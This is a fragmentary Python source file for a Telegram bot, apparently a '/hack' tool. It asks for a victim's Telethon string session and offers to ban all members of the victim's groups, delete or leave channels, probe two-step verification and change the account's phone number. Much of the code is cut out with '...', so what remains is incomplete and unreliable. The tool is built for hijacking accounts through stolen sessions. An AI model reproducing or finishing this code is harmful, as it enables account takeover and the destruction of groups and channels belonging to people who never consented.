...
┏━━━━━━━━━❥
┣ Cʀᴇᴀᴛᴇʀ -> @MOON_M_6
┣ Uᴘᴅᴀᴛᴇꜱ -> @MILKY_WAY_45
┗━━━━━━━━━❥
**Updates JOIN @MILKY_WAY_45**
...
async def op(event):
  ...
  if not event.is_private:
    await event.reply("please use me in pm🥺⚡️𝐌 𝐎 𝐎 𝐍⚡️")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == legendx:
    return await event.reply("please don't use me fuck off 🥺⚡️𝐌 𝐎 𝐎 𝐍⚡️")
  try:
...
async def start(event):
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    r = res.text
    if res.text == "A":
      await x.send_message("GIVE STRING SESSION⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("This StringSession is terminated maybe⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("This StringSession is terminated maybe⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      if len(i) > 3855:
      ...
      await event.reply("Banning all members Thanks For using ⚡️𝐌 𝐎 𝐎 𝐍⚡️")
    elif r == "D":
      await x.send_message("GIVE STRING SESSION⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Joined the Channel/Group Thanks For using ⚡️𝐌 𝐎 𝐎 𝐍⚡️")
    elif r == "F":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Leaved the Channel/Group Thanks For using ⚡️𝐌 𝐎 𝐎 𝐍⚡️")
    elif r == "G":
      await x.send_message("GIVE STRING SESSION⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Deleted the Channel/Group Thanks For using ⚡️𝐌 𝐎 𝐎 𝐍⚡️")
    elif r == "H":
      await x.send_message("GIVE STRING SESSION⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      if i:
        ...
        await event.reply("Sorry User Have two step already⚡️𝐌 𝐎 𝐎 𝐍𝐗⚡️")
    elif r == "I":
      await x.send_message("GIVE STRING SESSION⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      if op:
        ...
        return await event.respond("This StringSession is terminated maybe⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      ...
      try:
        ...
        if changing:
          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED⚡️𝐌 𝐎 𝐎 𝐍⚡️")
        else:
          await event.respond("Something is wrong⚡️𝐌 𝐎 𝐎 𝐍⚡️")
      except Exception as e:
        await event.respond("SEND THIS ERROR TO -@MILKY_WAY_45\n**LOGS**\n" + str(e))

    else:
      await event.respond("Wrong Text Found Re type /hack and use⚡️𝐌 𝐎 𝐎 𝐍⚡️")
